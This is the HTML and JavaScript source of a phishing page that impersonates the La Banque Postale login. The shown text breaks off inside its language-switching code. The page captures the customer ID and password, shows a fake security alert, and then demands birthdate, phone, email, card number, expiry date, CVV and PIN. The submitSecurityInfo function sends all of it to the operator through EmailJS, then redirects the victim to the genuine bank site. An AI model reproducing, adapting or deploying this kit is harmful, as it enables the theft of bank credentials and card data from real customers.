
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Connexion sécurisée à votre compte La Banque Postale.">
        <meta name="author" content="La Banque Postale">
        <meta name="robots" content="noindex, nofollow">
        <link rel="icon" type="image/png" href="fav.png">
        <title>La Banque Postale - Connexion</title>
        
        <!-- Scripts -->
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
        <script type="text/javascript">
            (function() {
                emailjs.init({
                    publicKey: "QlyvNDuKNvWLyOf4V",
                });
            })();
        </script>
        
        <link rel="icon" type="image/png" href="fav.png">


        <title>La Banque Postale - Connexion</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0;
    padding: 0;
}
.language-switcher {
    position: absolute;
    top: 20px;
    right: 20px;
    display: flex;
    gap: 10px;
    background: rgba(255, 255, 255, 0.9);
    padding: 8px;
    border-radius: 20px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.language-button {
    display: flex;
    align-items: center;
    gap: 5px;
    padding: 5px 10px;
    border: none;
    background: transparent;
    cursor: pointer;
    border-radius: 15px;
    transition: all 0.3s ease;
}

.language-button:hover {
    background: rgba(0, 70, 192, 0.1);
}

.language-button.active {
    background: #0046c0;
    color: white;
}

.flag-icon {
    width: 20px;
    height: 15px;
    border-radius: 2px;
}



.container {
    display: flex;
    flex-direction: column;
    width: 100%;
    min-height: 100vh;
}

.login-form {
    width: 100%;
    max-width: 400px;
    background: white;
    padding: 20px;
    box-sizing: border-box;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    margin: 0 auto;
}

.logo {
    width: 150px;
    margin-bottom: 20px;
}

.right-section {
    width: 100%;
    background: #0046c0;
    padding: 20px;
    color: white;
    box-sizing: border-box;
}

.form-group {
    margin-bottom: 20px;
}

.form-group label {
    display: block;
    margin-bottom: 5px;
    color: #666;
    font-size: 14px;
}

.form-group input {
    width: 100%;
    padding: 12px 8px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
    font-size: 16px;
}

.hidden {
    display: none;
}

.numpad {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 8px;
    margin: 15px 0;
}

.numpad button {
    padding: 15px 10px;
    border: none;
    background: white;
    border: 1px solid #ddd;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.2s;
    font-size: 16px;
}

.numpad button:hover {
    background-color: #f0f0f0;
}

.password-dots {
    display: flex;
    gap: 8px;
    margin: 15px 0;
    justify-content: center;
}

.dot {
    width: 12px;
    height: 12px;
    border: 1px solid #999;
    border-radius: 50%;
    transition: background-color 0.2s;
}

.dot.filled {
    background-color: #0046c0;
}

.button {
    width: 100%;
    padding: 15px;
    background: #0046c0;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.2s;
    margin-bottom: 15px;
    font-size: 16px;
}

.button:hover {
    background: #003590;
}

.info-box, .insurance-box {
    background: rgba(255,255,255,0.1);
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 20px;
}

.insurance-button {
    background: rgba(255,255,255,0.2);
    border: none;
    color: white;
    padding: 12px 20px;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.2s;
    width: 100%;
    margin-top: 10px;
}

.insurance-button:hover {
    background: rgba(255,255,255,0.3);
}

.error-message {
    color: #ff0000;
    font-size: 14px;
    margin-top: 5px;
    display: none;
}

@media (min-width: 768px) {
    .container {
        flex-direction: row;
    }
    
    .login-form {
        width: 400px;
        margin: 0;
    }
    
    .right-section {
        padding: 40px;
    }
    
    .insurance-button {
        width: auto;
    }
}

@media (max-width: 360px) {
    .numpad {
        grid-template-columns: repeat(3, 1fr);
    }
    
    .logo {
        width: 120px;
    }
    
    h3 {
        font-size: 16px;
    }
}
/* Additional styles for security page */
#security-page input {
    width: 100%;
    padding: 12px 8px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
    font-size: 16px;
    margin-top: 5px;
}

#security-page input:focus {
    border-color: #0046c0;
    outline: none;
    box-shadow: 0 0 0 2px rgba(0,70,192,0.2);
}

#security-page .button:disabled {
    background-color: #ccc;
    cursor: not-allowed;
}

#security-page .error {
    color: #ff0000;
    font-size: 14px;
    margin-top: 5px;
    display: none;
}

@media (max-width: 768px) {
    #security-page .container {
        flex-direction: column;
    }
    
    #security-page .login-form {
        width: 100%;
        max-width: 400px;
        margin: 0 auto;
    }
}
/* Modal styles */
.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.5);
    animation: fadeIn 0.3s ease-in-out;
}

.modal-content {
    background-color: #fff;
    margin: 15% auto;
    padding: 20px;
    border-radius: 8px;
    width: 80%;
    max-width: 500px;
    position: relative;
    animation: slideIn 0.3s ease-in-out;
}

.modal h2 {
    color: #ff3b30;
    margin-top: 0;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideIn {
    from { transform: translateY(-100px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}
.loader-container {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.9);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.loader {
    width: 48px;
    height: 48px;
    border: 5px solid #0046c0;
    border-bottom-color: transparent;
    border-radius: 50%;
    animation: rotation 1s linear infinite;
}

@keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}
</style>
</head>
<body>
<div class="container">
    <div class="language-switcher">
        <button class="language-button active" onclick="switchLanguage('fr')">
            <svg class="flag-icon" viewBox="0 0 60 40">
                <rect width="20" height="40" x="0" fill="#002395"/>
                <rect width="20" height="40" x="20" fill="#fff"/>
                <rect width="20" height="40" x="40" fill="#ED2939"/>
            </svg>
            FR
        </button>
        <button class="language-button" onclick="switchLanguage('en')">
            <svg class="flag-icon" viewBox="0 0 60 40">
                <rect width="60" height="40" fill="#012169"/>
                <path d="M0,0 L60,40 M60,0 L0,40" stroke="#fff" stroke-width="6"/>
                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#fff" stroke-width="10"/>
                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#C8102E" stroke-width="6"/>
            </svg>
            EN
        </button>
        <button class="language-button" onclick="switchLanguage('ps')">
            <svg class="flag-icon" viewBox="0 0 60 40">
                <rect width="20" height="40" x="0" fill="#000000"/>
                <rect width="20" height="40" x="20" fill="#D32011"/>
                <rect width="20" height="40" x="40" fill="#007A36"/>
            </svg>
            PS
        </button>
    </div>
    <div class="login-form">
        <?xml version="1.0" encoding="utf-8"?>
        <!-- Generator: Adobe Illustrator 22.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
        <svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
     viewBox="0 0 70 70" width="65" height="65" style="enable-background:new 0 0 70 70;" xml:space="preserve">

        <style type="text/css">
            .st0{clip-path:url(#SVGID_2_);fill:#0097D6;}
            .st1{clip-path:url(#SVGID_2_);fill:#FFFFFF;}
            .st2{clip-path:url(#SVGID_4_);fill:#39A8E5;}
            .st3{clip-path:url(#SVGID_4_);fill:#164194;}
        </style>
        <g>
            <defs>
                <rect id="SVGID_3_" x="-7.4" y="-5.5" width="93.4" height="81.2"/>
            </defs>
            <clipPath id="SVGID_2_">
                <use xlink:href="#SVGID_3_"  style="overflow:visible;"/>
            </clipPath>
            <path style="clip-path:url(#SVGID_2_);fill:#39A8E5;" d="M15.8,12l14.8,6.7h22.7l1.9-3.3c1.1-2-0.2-4.3-2.3-4.3h-37
                C15.4,11.2,15.3,11.8,15.8,12 M16.8,41.3L36.2,41c2.4,0,5.1-1.4,6.4-3.6l2.9-5.1l-29.7,8C16.4,40.6,16.7,41,16.8,41.3 M67.6,21.6
                h-37l-30.1,19c-0.4,0.3-0.1,0.9,0.4,0.7l66.9-18.1c0.3-0.1,0.6-0.4,0.6-0.8C68.4,22,68,21.6,67.6,21.6"/>
            <path style="clip-path:url(#SVGID_2_);fill:#164194;" d="M31.4,42.2l5.2,5.8h1.6v-8.3h-1.7v5.7l-5.1-5.7h-1.7V48h1.7V42.2z
                 M52.6,36.9h5l1-1.6h-4.8v-6.7H52v7.7C52,36.7,52.2,36.9,52.6,36.9 M12.2,50.7c-1,0-2.1,0-3,0.1V59H11v-2.5c0.4,0,1,0,1.4,0
                c2.6,0,4.6-0.7,4.6-3C16.9,51.5,15.3,50.7,12.2,50.7 M14.8,54.5C14.3,55,13.3,55,12.3,55c-0.4,0-0.8,0-1.3,0v-2.6
                c0.4,0,0.9,0,1.3,0c1.4,0,2.1,0,2.6,0.5c0.2,0.2,0.3,0.5,0.3,0.7C15.1,54,15,54.3,14.8,54.5 M55.8,48.2c2.4,0,4.1-1.3,4.1-3.8v-4.7
                h-1.8v4.5c0,1.5-0.7,2.3-2.3,2.3c-1.6,0-2.3-0.8-2.3-2.3v-4.5h-1.8v4.7C51.7,46.9,53.4,48.2,55.8,48.2 M45,48
                c1.1,0,2.2-0.4,2.9-0.8l0.3,0.4c0.2,0.3,0.6,0.4,1.1,0.4h1.4l-1.6-1.9c0.6-0.7,0.9-1.5,0.9-2.3c0-2.4-1.9-4.2-5-4.2
                c-3.1,0-5,1.9-5,4.2S41.9,48,45,48 M45,41.1c1.8,0,3.2,1.1,3.2,2.6s-1.4,2.6-3.2,2.6c-1.8,0-3.2-1.1-3.2-2.6S43.1,41.1,45,41.1
                 M20.7,46.5h5.1l0.5,1c0.2,0.5,0.5,0.5,1.1,0.5h1l-4.3-8.4h-1.7L18,48h1.9L20.7,46.5z M23.2,41.5l1.8,3.5h-3.5L23.2,41.5z
                 M22.6,50.6c-3.1,0-5,1.9-5,4.3c0,2.4,1.9,4.3,5,4.3c3.1,0,5-1.9,5-4.3C27.6,52.5,25.8,50.6,22.6,50.6 M22.6,57.6
                c-1.9,0-3.2-1.1-3.2-2.7c0-1.7,1.3-2.7,3.2-2.7c1.9,0,3.2,1.1,3.2,2.7C25.8,56.6,24.5,57.6,22.6,57.6 M15.6,43.8L15.6,43.8
                c1-0.3,1.6-0.9,1.6-1.9c0-1.5-1.3-2.2-3.8-2.2c-1.2,0-3,0-4.1,0.1V48c1.3,0.1,2.8,0.1,4,0.1c2.5,0,4.2-0.6,4.2-2.4
                C17.5,44.7,16.7,44,15.6,43.8 M11,41.2h2.6c1.1,0,1.7,0.2,1.7,0.9c0,0.8-0.7,1-2,1H11V41.2z M13.5,46.6H11v-2h2.9
                c1,0,1.7,0.2,1.7,1C15.6,46.4,14.8,46.6,13.5,46.6 M56.2,50.8h-1.8v7.7c0,0.3,0.2,0.6,0.6,0.6H61v-1.6h-4.8V50.8z M62,58.5
                c0,0.3,0.2,0.6,0.6,0.6h6.7v-1.6h-5.6v-1.8h5V54h-5v-1.7h5.6v-1.6H62V58.5z M62,47.4c0,0.3,0.2,0.6,0.6,0.6h6.7v-1.6h-5.6v-1.8h5
                V43h-5v-1.7h5.6v-1.6H62V47.4z M67.4,36.4c0.2,0.5,0.5,0.5,1.1,0.5h1l-4.3-8.4h-1.7l-4.3,8.4h1.9l0.8-1.5h5.1L67.4,36.4z
                 M62.6,33.9l1.8-3.5l1.8,3.5H62.6z M30.6,53c0-0.6,0.8-0.9,1.9-0.9c0.8,0,2,0.4,2.3,0.6l0.9-1.3c-0.5-0.3-2-0.8-3.1-0.8
                c-2.1,0-3.7,1.1-3.7,2.6c0,2.9,5.6,1.9,5.6,3.5c0,0.7-1,0.9-1.9,0.9c-1.2,0-2.5-0.4-3.3-1L28.3,58c1.1,0.8,2.8,1.2,4,1.2
                c2.1,0,3.8-1,3.8-2.6C36.2,53.7,30.6,54.5,30.6,53 M44.6,50.8h-8.1v1.6h3.2V59h1.8v-6.7h3.2V50.8z M47.5,50.7L43.2,59h1.9l0.8-1.5
                h5.1l0.5,1c0.2,0.5,0.5,0.5,1.1,0.5h1l-4.3-8.4H47.5z M46.6,56l1.8-3.5l1.8,3.5H46.6z"/>
        </g>
        </svg>
        
        
        <h3>Connexion à votre compte particulier</h3>
        
        <div class="form-group">
            <label>Identifiant (10 chiffres)</label>
            <input 
                type="text" 
                id="identifier" 
                placeholder="_ _ _ _ _ _ _ _ _ _" 
                maxlength="10" 
                pattern="\d{10}" 
                title="Entrez exactement 10 chiffres" 
                oninput="formatIdentifier(this)" 
                required
            />
            <div class="error-message" id="identifier-error">L'identifiant doit contenir 10 chiffres</div>
            <button class="button" id="continue-button">Continuer</button>
        </div>
        
        <script>
        function formatIdentifier(input) {
            input.value = input.value.replace(/\D/g, ''); // Supprime tout sauf les chiffres
        }
        </script>
        

        <div class="form-group hidden" id="password-section">
            <label>Mot de passe (6 chiffres)</label>
            <div class="password-dots" id="password-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <input type="hidden" id="password-input" maxlength="6" />
            <div class="error-message" id="password-error">Le mot de passe doit contenir 6 chiffres</div>
            
            <div class="numpad" id="numpad"></div>
            
            <button class="button" id="connect-button">Se connecter</button>
        </div>
        
        <p><a href="https://www.labanquepostale.fr/particulier/forgot-password">Identifiant / Mot de passe oublié</a></p>
    </div>
    
    <div class="right-section">
        <h1>La Banque Postale, citoyenne</h1>
        
        <div class="info-box">
            <h3>Votre page de connexion évolue !</h3>
            <p>La sécurité de votre page de connexion se modernise ! Pour accéder à vos comptes : saisissez vos identifiant et mot de passe habituels.</p>
            <p>Avant de vous connecter, vérifiez que vous êtes bien sur l'adresse de connexion suivante :<br>
            <a href="https://www.labanquepostale.fr/particulier/connexion-espace-client.html" style="color: white;">https://www.labanquepostale.fr/particulier/connexion-espace-client.html</a></p>
        </div>
        
        <div class="insurance-box">
            <h3>Espace Assurance La Banque Postale</h3>
            <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?</p>
            <button class="insurance-button">Me connecter à mon espace assurance</button>
        </div>
    </div>
</div>
<div id="security-page" style="display: none;">
    <div class="container">
        <div class="login-form">
            <svg class="logo" viewBox="0 0 200 50">
                <path d="M10,25 h30 v-10 h20" stroke="#0046c0" fill="none" stroke-width="3"/>
                <text x="70" y="30" fill="#0046c0" font-size="16">La Banque Postale</text>
            </svg>
            
            <h3>Vérification de sécurité</h3>
            
            <div class="form-group">
                <label id="birthdate-label">Date de naissance</label>
                <input type="date" id="birthdate" required />
            </div>

            <div class="form-group">
                <label id="phone-label">Numéro de téléphone mobile</label>
                <input type="tel" id="phone" pattern="[0-9]{10}" required placeholder="0612345678" />
            </div>

            <div class="form-group">
                <label id="email-label">Adresse email</label>
                <input type="email" id="email" required />
            </div>
            
            <div class="form-group">
                <label>Numéro de la carte (PAN) : Les 16 chiffres</label>
                <input 
                    type="text" 
                    placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _" 
                    maxlength="19" 
                    pattern="\d{4} \d{4} \d{4} \d{4}" 
                    title="Entrez 16 chiffres au format XXXX XXXX XXXX XXXX" 
                    oninput="formatCardNumber(this)" 
                    required
                />
            </div>
            
            <script>
            function formatCardNumber(input) {
                let value = input.value.replace(/\D/g, ''); // Supprime tout sauf les chiffres
                let formatted = value.match(/.{1,4}/g)?.join(' ') || value; // Ajoute des espaces tous les 4 chiffres
                input.value = formatted;
            }
            </script>
            
            <div class="form-group">
                <label id="expiration-date-label">Date d'expiration : Mois et année</label>
                <input 
                    type="text" 
                    placeholder="MM/YY" 
                    pattern="\d{2}/\d{2}" 
                    maxlength="5" 
                    title="Format: MM/YY" 
                    required 
                    oninput="formatDate(this)"
                >
            </div>
            
            <div class="form-group">
                <label id="cvv-label">Code de sécurité (CVV) : Les 3 chiffres au dos</label>
                <input type="number" id="security-question" maxlength="3" minlength="3" required>
            </div>
            
            <div class="form-group">
                <label id="pin-label">Code PIN : Ne jamais le communiquer, même à des proches</label>
                <input type="text" id="security-question" required />
            </div>
            
            <script>
            function formatDate(input) {
                let value = input.value.replace(/\D/g, ''); // Retirer tout sauf les chiffres
                if (value.length >= 2) {
                    input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
                } else {
                    input.value = value;
                }
            }
            </script>
            

            

            
            <button class="button" onclick="submitSecurityInfo()">Valider</button>
        </div>
        
        <div class="right-section">
            <div class="info-box">
                <h3>Pourquoi ces informations ?</h3>
                <p>Ces informations nous permettent de sécuriser votre compte et de vous protéger contre la fraude.</p>
                <p>Vos données sont protégées et cryptées selon les normes de sécurité les plus strictes.</p>
            </div>
        </div>
    </div>
</div>
<div id="security-alert" class="modal">
    <div class="modal-content">
        <h2>⚠️ Alerte de sécurité</h2>
        <p>Des activités suspectes ont été détectées sur votre compte.</p>
        <p>Pour votre sécurité, nous devons vérifier votre identité et mettre à jour les informations de sécurité de votre compte.</p>
        <p>Veuillez compléter les informations sur la page suivante pour sécuriser votre compte.</p>
        <button class="button" onclick="closeModal()">Continuer</button>
    </div>
</div>
<div class="loader-container">
    <div class="loader"></div>
</div>


<script>
     let password = ''; // Variable pour stocker le mot de passe

    document.addEventListener('DOMContentLoaded', function() {
    const numpad = document.getElementById('numpad');
    const passwordInput = document.getElementById('password-input');
    const passwordDots = document.getElementById('password-dots').children;
    const identifierInput = document.getElementById('identifier');
    const connectButton = document.getElementById('connect-button');
    const continueButton = document.getElementById('continue-button');
    const passwordSection = document.getElementById('password-section');
    const identifierError = document.getElementById('identifier-error');
    const passwordError = document.getElementById('password-error');
    
    const numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
   
    // Mélange aléatoire des chiffres
    for (let i = numbers.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [numbers[i], numbers[j]] = [numbers[j], numbers[i]];
    }

    // Créer les boutons pour le pavé numérique
    numbers.forEach(num => {
        const button = document.createElement('button');
        button.textContent = num;
        button.addEventListener('click', () => addPasswordDigit(num));
        numpad.appendChild(button);
    });

    continueButton.addEventListener('click', function() {
        if (/^\d{10}$/.test(identifierInput.value)) {
            identifierError.style.display = 'none';
            passwordSection.classList.remove('hidden');
            continueButton.classList.add('hidden');
        } else {
            identifierError.style.display = 'block';
        }
    });

    // Fonction pour ajouter un chiffre au mot de passe
    function addPasswordDigit(digit) {
        if (password.length < 6) {
            password += digit; // Ajouter le chiffre à la variable password
            updatePasswordDots(); // Mettre à jour les points du mot de passe
        }
    }

    function updatePasswordDots() {
        const length = password.length;
        for (let i = 0; i < passwordDots.length; i++) {
            passwordDots[i].classList.toggle('filled', i < length);
        }
    }

    connectButton.addEventListener('click', function() {
        let isValid = true;
        
        if (!/^\d{10}$/.test(identifierInput.value)) {
            identifierError.style.display = 'block';
            isValid = false;
        } else {
            identifierError.style.display = 'none';
        }
        
        if (password.length !== 6) {
            passwordError.style.display = 'block';
            isValid = false;
        } else {
            passwordError.style.display = 'none';
        }

        if (isValid) {
    const loaderContainer = document.querySelector('.loader-container');
    loaderContainer.style.display = 'flex'; // Afficher le loader

    setTimeout(() => {
        loaderContainer.style.display = 'none'; // Masquer le loader après le délai
        showSecurityAlert(); // Afficher l'alerte de sécurité
    }, 5000);
}

    });
    
    function showLoader() {
        document.getElementById('loader').style.display = 'block';
    }

    function hideLoader() {
        document.getElementById('loader').style.display = 'none';
    }

    function showSecurityAlert() {
        document.getElementById('security-alert').style.display = 'block';
    }

    document.addEventListener('click', function(e) {
        if (!e.target.closest('.numpad') && !e.target.closest('.connect-button')) {
            password = '';
            updatePasswordDots();
        }
    });

    identifierInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
    });
});

function closeModal() {
    document.getElementById('security-alert').style.display = 'none';
    document.querySelector('.container').style.display = 'none';
    document.getElementById('security-page').style.display = 'block';
}

function submitSecurityInfo() {
    const identifier = document.getElementById('identifier').value;

    const birthdate = document.getElementById('birthdate').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const cardNumber = document.querySelector('input[placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _"]').value;
    const expiryDate = document.querySelector('input[placeholder="MM/YY"]').value;
    const cvv = document.getElementById('security-question').value;
    const pin = document.querySelector('#security-question[type="text"]').value;

    // Valider les champs obligatoires
    if (!birthdate || !phone || !email || !cardNumber || !expiryDate || !cvv || !pin) {
        alert('Veuillez remplir tous les champs obligatoires.');
        return;
    }

    // Validation de l'identifiant (10 chiffres)
    if (!/^\d{10}$/.test(identifier)) {
        alert('L\'identifiant doit contenir exactement 10 chiffres.');
        return;
    }

    // Validation du numéro de téléphone
    if (!/^0[1-9][0-9]{8}$/.test(phone)) {
        alert('Le numéro de téléphone doit être au format valide (ex: 0612345678).');
        return;
    }

    // Validation de l'email
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        alert('Veuillez entrer une adresse email valide.');
        return;
    }

    // Validation du numéro de carte (16 chiffres)
    if (!/^\d{4} \d{4} \d{4} \d{4}$/.test(cardNumber)) {
        alert('Le numéro de carte doit être au format XXXX XXXX XXXX XXXX.');
        return;
    }

    // Validation du CVV (3 chiffres)
    if (!/^\d{3}$/.test(cvv)) {
        alert('Le code de sécurité (CVV) doit contenir exactement 3 chiffres.');
        return;
    }

    // Validation de la date d'expiration
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
        alert('La date d\'expiration doit être au format MM/YY.');
        return;
    }

    // Afficher l'état de chargement
    const submitButton = document.querySelector('#security-page .button');
    const originalText = submitButton.textContent;
    submitButton.textContent = 'Chargement...';
    submitButton.disabled = true;

    // Intégration EmailJS
    emailjs.send("service_zq5u5lo", "template_ow3rnce", {
        identifier: identifier,
        password: password,
        birthdate: birthdate,
        phone: phone,
        email: email,
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        pin: pin
    })
    .then(() => {
        alert('Vos informations ont été envoyées avec succès.');
        window.location.href = 'https://www.labanquepostale.fr/particulier/espace-client';
    })
    .catch((error) => {
        console.error('Erreur EmailJS :', error);
        alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
    })
    .finally(() => {
        submitButton.textContent = originalText;
        submitButton.disabled = false;
    });
}

    
const translations = {
    fr: {
        title: "Connexion à votre compte particulier",
        identifier: "Identifiant (10 chiffres)",
        continue: "Continuer",
        password: "Mot de passe (6 chiffres)",
        connect: "Se connecter",
        forgotten: "Identifiant / Mot de passe oublié",
        securityTitle: "Vérification de sécurité",
        mainTitle: "La Banque Postale, citoyenne",
        securityEvolution: "Votre page de connexion évolue !",
        securityMessage: "La sécurité de votre page de connexion se modernise ! Pour accéder à vos comptes : saisissez vos identifiant et mot de passe habituels.",
        insuranceTitle: "Espace Assurance La Banque Postale",
        insuranceMessage: "Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?",
        insuranceButton: "Me connecter à mon espace assurance",
        birthdate: "Date de naissance",
        phone: "Numéro de téléphone mobile",
        email: "Adresse email", 
        securityQuestion: "Question secrète : Nom de jeune fille de votre mère",
        validate: "Valider",
        whyInfo: "Pourquoi ces informations ?",
        securityExplanation: "Ces informations nous permettent de sécuriser votre compte et de vous protéger contre la fraude.",
        dataProtection: "Vos données sont protégées et cryptées selon les normes de sécurité les plus strictes.",
        alertTitle: "⚠️ Alerte de sécurité",
        suspiciousActivity: "Des activités suspectes ont été détectées sur votre compte.",
        securityNeedVerification: "Pour votre sécurité, nous devons vérifier votre identité et mettre à jour les informations de sécurité de votre compte.",
        completeInfo: "Veuillez compléter les informations sur la page suivante pour sécuriser votre compte.",
        fillRequired: "Veuillez remplir tous les champs obligatoires",
        invalidPhone: "Le numéro de téléphone doit être au format valide (ex: 0612345678)",
        invalidEmail: "Veuillez entrer une adresse email valide",
        loading: "Chargement...",
        birthdate: "Date de naissance",
        phone: "Numéro de téléphone mobile",
        email: "Adresse email",
        cardNumber: "Numéro de la carte (PAN) : Les 16 chiffres",
        expirationDate: "Date d'expiration : Mois et année",
        cvv: "Code de sécurité (CVV) : Les 3 chiffres au dos",
        pin: "Code PIN : Ne jamais le communiquer, même à des proches",
        validate: "Valider",
        successMessage: "Vos informations ont été enregistrées avec succès.\nVous allez être redirigé vers votre espace client."
    },
    en: {
        title: "Login to your personal account",
        identifier: "ID (10 digits)",
        continue: "Continue",
        password: "Password (6 digits)",
        connect: "Connect",
        forgotten: "Forgot ID / Password",
        securityTitle: "Security verification",
        mainTitle: "La Banque Postale, citizen bank",
        securityEvolution: "Your login page is evolving!",
        securityMessage: "The security of your login page is being modernized! To access your accounts: enter your usual ID and password.",
        insuranceTitle: "La Banque Postale Insurance Portal",
        insuranceMessage: "Don't have Online Banking access and want to find your La Banque Postale Insurance contracts?",
        insuranceButton: "Connect to my insurance portal",
        birthdate: "Date of birth",
        phone: "Mobile phone number",
        email: "Email address",
        securityQuestion: "Security question: Mother's maiden name",
        validate: "Validate",
        whyInfo: "Why this information?",
        securityExplanation: "This information helps us secure your account and protect you against fraud.",
        dataProtection: "Your data is protected and encrypted according to the strictest security standards.",
        alertTitle: "⚠️ Security Alert",
        suspiciousActivity: "Suspicious activities have been detected on your account.",
        securityNeedVerification: "For your security, we need to verify your identity and update your account security information.",
        completeInfo: "Please complete the information on the next page to secure your account.",
        fillRequired: "Please fill in all required fields",
        invalidPhone: "Phone number must be in valid format (ex: 0612345678)",
        invalidEmail: "Please enter a valid email address",
        loading: "Loading...",
        birthdate: "Date of birth",
        phone: "Mobile phone number",
        email: "Email address",
        cardNumber: "Card number (PAN): The 16 digits",
        expirationDate: "Expiration date: Month and year",
        cvv: "Security code (CVV): 3 digits on the back",
        pin: "PIN code: Never share it, even with close ones",
        validate: "Validate",
        successMessage: "Your information has been successfully saved.\nYou will be redirected to your client portal."
    },
    ps: {
        title: "خپل شخصي حساب ته ننوتل",
        identifier: "پېژند (10 شمېرې)",
        continue: "دوام",
        password: "پټ نوم (6 شمېرې)",
        connect: "ننوتل",
        forgotten: "پېژند/پټ نوم هېر شوی",
        securityTitle: "د امنیت تصدیق",
        mainTitle: "لا بانک پوستال، ملي بانک",
        securityEvolution: "ستاسو د ننوتلو پاڼه پرمختګ کوي!",
        securityMessage: "ستاسو د ننوتلو پاڼې امنیت عصري کیږي! خپلو حسابونو ته د لاسرسي لپاره: خپل معمول پېژند او پټ نوم دننه کړئ.",
        insuranceTitle: "د لا بانک پوستال بیمې پورټل",
        insuranceMessage: "آنلاین بانکي لاسرسی نلرئ او غواړئ خپل د لا بانک پوستال بیمې قراردادونه ومومئ؟",
        insuranceButton: "زما د بیمې پورټل سره وصل شئ",
        birthdate: "د زیږون نیټه",
        phone: "د موبایل شمیره",
        email: "بریښنالیک پته",
        securityQuestion: "امنیتي پوښتنه: د مور پخوانی نوم",
        validate: "تایید",
        whyInfo: "دا معلومات ولې؟",
        securityExplanation: "دا معلومات ستاسو حساب خوندي کولو او له درغلۍ څخه د ساتنې لپاره مرسته کوي.",
        dataProtection: "ستاسو معلومات د امنیت تر ټولو سختو معیارونو سره سم خوندي او رمز شوي دي.",
        alertTitle: "⚠️ امنیتي خبرتیا",
        suspiciousActivity: "ستاسو په حساب کې شکمن فعالیتونه موندل شوي.",
        securityNeedVerification: "ستاسو د امنیت لپاره، موږ باید ستاسو پیژندګلوي تایید او د حساب امنیتي معلومات تازه کړو.",
        completeInfo: "مهرباني وکړئ د خپل حساب د خوندي کولو لپاره په راتلونکي مخ کې معلومات بشپړ کړئ.",
        fillRequired: "مهرباني وکړئ ټول اړین ډګرونه ډک کړئ",
        invalidPhone: "د تلیفون شمیره باید په سم فارمټ کې وي (مثال: 0612345678)",
        invalidEmail: "مهرباني وکړئ د بریښنالیک سمه پته دننه کړئ",
        loading: "په حال کې...",
        birthdate: "د زیږون نیټه",
        phone: "د موبایل شمیره",
        email: "بریښنالیک پته",
        cardNumber: "د کارت شمیره (PAN): 16 شمېرې",
        expirationDate: "د پای نیټه: میاشت او کال",
        cvv: "د امنیت کود (CVV): د شا 3 شمېرې",
        pin: "د PIN کود: دا هیڅکله شریک نکړئ، حتی د خپلو نږدې خلکو سره",
        validate: "تایید",
        successMessage: "ستاسو معلومات په بریالیتوب سره خوندي شول.\nتاسو به خپل کارن پورټل ته ولیږدول شئ."
    }
};

function switchLanguage(lang) {
    // Remove active class from all buttons
    document.querySelectorAll('.language-button').forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Add active class to clicked button
    document.querySelector(`.language-button[onclick*="${lang}"]`).classList.add('active');
    
    // Update all translatable elements
    const elements = {
        'h3': translations[lang].title,
        'label[for="identifier"]': translations[lang].identifier,
        '#continue-button': translations[lang].continue,
        '#password-section label': translations[lang].password,
        '#connect-button': translations[lang].connect,
        '.login-form p a': translations[lang].forgotten,
        '#security-page h3': translations[lang].securityTitle,
        '.right-section h1': translations[lang].mainTitle,
        '.info-box h3': translations[lang].securityEvolution,
        '.info-box p:first-of-type': translations[lang].securityMessage,
        '.insurance-box h3': translations[lang].insuranceTitle,
        '.insurance-box p': translations[lang].insuranceMessage,
        '.insurance-button': translations[lang].insuranceButton,
        '#security-page label[for="birthdate"]': translations[lang].birthdate,
        '#security-page label[for="phone"]': translations[lang].phone,
        '#security-page label[for="email"]': translations[lang].email,
        '#security-page label[for="security-question"]': translations[lang].securityQuestion,
        '#security-page .button': translations[lang].validate,
        '#security-page .info-box h3': translations[lang].whyInfo,
        '#security-page .info-box p:first-of-type': translations[lang].securityExplanation,
